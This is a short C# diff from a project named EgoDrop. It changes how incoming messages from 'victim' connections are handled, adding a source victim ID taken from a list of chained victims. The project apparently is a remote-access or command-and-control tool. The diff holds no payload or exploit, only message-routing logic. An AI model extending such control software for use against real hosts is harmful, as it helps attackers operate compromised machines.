@@ -198,10 +198,12 @@ namespace EgoDrop
                                         }
                                     }
 
+                                    string szSrcVictimID = lsVictim.Last();
+
+                                    fnOnReceivedMessage(victim, szSrcVictimID, lsMsg);
+
                                     if (lsMsg[0] == "info")
                                         fnOnAddChain(lsVictim);
-
-                                    fnOnReceivedMessage(victim, lsMsg);
                                 }
                             }
                         }
